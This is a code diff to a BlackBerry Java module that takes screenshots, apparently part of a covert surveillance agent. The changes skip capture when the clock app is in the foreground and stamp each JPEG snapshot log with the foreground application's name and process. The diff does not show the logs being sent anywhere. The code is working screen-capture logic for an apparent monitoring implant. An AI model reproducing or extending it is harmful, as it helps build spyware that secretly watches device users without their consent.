@@ -16,6 +16,7 @@ import net.rim.device.api.system.EncodedImage;
 import net.rim.device.api.system.JPEGEncodedImage;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Messages;
+import blackberry.Status;
 import blackberry.config.ConfModule;
 import blackberry.config.ConfigurationException;
 import blackberry.debug.Check;
@@ -92,7 +93,7 @@ public final class ModuleSnapshot extends BaseInstantModule {
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
-    public void actualStart() {
+    public synchronized void actualStart() {
 
         //#ifdef DEBUG
         debug.trace("snapshot"); //$NON-NLS-1$
@@ -105,24 +106,30 @@ public final class ModuleSnapshot extends BaseInstantModule {
             return;
         }
         
-        EncodedImage encoded;
-       
-        synchronized (this) {
-            if (bitmap == null) {
-                width = Display.getWidth();
-                height = Display.getHeight();
-                bitmap = new Bitmap(width, height);
-            }
-
-            getScreenshot();
-
+        if("net_rim_bb_alarm_app".equals(Status.getInstance().getCurrentForegroundAppMod())){
             //#ifdef DEBUG
-            debug.info("Taking screenshot"); //$NON-NLS-1$
+            debug.trace("actualStart: clock, ignore");
             //#endif
-
-            encoded = JPEGEncodedImage.encode(bitmap, quality);
+            
+            return;
         }
-        
+
+        EncodedImage encoded;
+
+        if (bitmap == null) {
+            width = Display.getWidth();
+            height = Display.getHeight();
+            bitmap = new Bitmap(width, height);
+        }
+
+        getScreenshot();
+
+        //#ifdef DEBUG
+        debug.info("Taking screenshot"); //$NON-NLS-1$
+        //#endif
+
+        encoded = JPEGEncodedImage.encode(bitmap, quality);
+
         byte[] plain = encoded.getData();
         encoded = null;
 
@@ -151,25 +158,25 @@ public final class ModuleSnapshot extends BaseInstantModule {
     }
 
     private byte[] getAdditionalData() {
-        final String window = "Desktop"; //$NON-NLS-1$
+        final String window = Status.self().getCurrentForegroundAppName(); //$NON-NLS-1$
+        final String program = Status.self().getCurrentForegroundAppMod(); //$NON-NLS-1$
 
         final int wlen = window.length() * 2;
-        final int tlen = wlen + 24;
+        final int plen = program.length() * 2;
+        final int tlen = wlen + plen + 24;
         final byte[] additionalData = new byte[tlen];
 
         final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen,
                 false);
 
         databuffer.writeInt(LOG_SNAPSHOT_VERSION); // version
-        databuffer.writeInt(0); // process name len
+        databuffer.writeInt(plen); // process name len
         databuffer.writeInt(wlen); // windows name len
 
-        byte[] windowsName = new byte[wlen];
-        windowsName = WChar.getBytes(window);
-        databuffer.write(windowsName);
+        databuffer.write(WChar.getBytes(program));
+        databuffer.write(WChar.getBytes(window));
 
         //#ifdef DBC
-        Check.asserts(windowsName.length == wlen, "Wrong windows name"); //$NON-NLS-1$
         Check.ensures(additionalData.length == tlen,
                 "Wrong additional data name"); //$NON-NLS-1$
         //#endif
